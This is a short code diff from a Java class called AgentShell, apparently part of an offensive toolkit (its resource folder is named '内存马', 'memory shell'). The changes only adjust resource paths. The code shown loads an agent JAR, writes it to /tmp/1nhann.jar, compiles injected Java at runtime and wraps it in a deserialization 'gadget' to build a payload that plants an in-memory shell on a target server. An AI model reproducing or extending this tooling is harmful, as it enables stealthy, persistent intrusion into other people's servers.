@@ -13,7 +13,7 @@ public class AgentShell {
 
     }
     public Object getObject(Class gadget,String jarPath) throws Exception {
-        byte[] bytes = ReadWrite.readResource(AgentShell.class,"内存马/AgentShell.java");
+        byte[] bytes = ReadWrite.readResource(AgentShell.class, "内存马/agent/AgentShell.java");
         String java = new String(bytes);
         java = java.replace("%jarPath%",jarPath);
         byte[] b = JavaCompiler.compile("AgentShell",java);
@@ -21,10 +21,10 @@ public class AgentShell {
         Object o = new Eval().getObject(gadget,c);
         return o;
     }
-    
+
     public Object getObject(Class gadget) throws Exception {
         String jarPath = "/tmp/1nhann.jar";
-        byte[] jarContent = ReadWrite.readResource(AgentShell.class,"内存马/agentshell.jar");
+        byte[] jarContent = ReadWrite.readResource(AgentShell.class, "内存马/agent/agentshell.jar");
         Object o = getObject(gadget,jarContent,jarPath);
         return o;
     }
@@ -53,7 +53,7 @@ public class AgentShell {
         code = code.replace("String b64 = \"%b64%\";",b64).replace("%destination%",jarPath);
         code = Eval.getJavaCodeFromJSP(code);
 
-        byte[] bytes = ReadWrite.readResource(AgentShell.class,"内存马/AgentShell.java");
+        byte[] bytes = ReadWrite.readResource(AgentShell.class, "内存马/agent/AgentShell.java");
         String java = new String(bytes);
         java = java.replace("%jarPath%",jarPath);
 
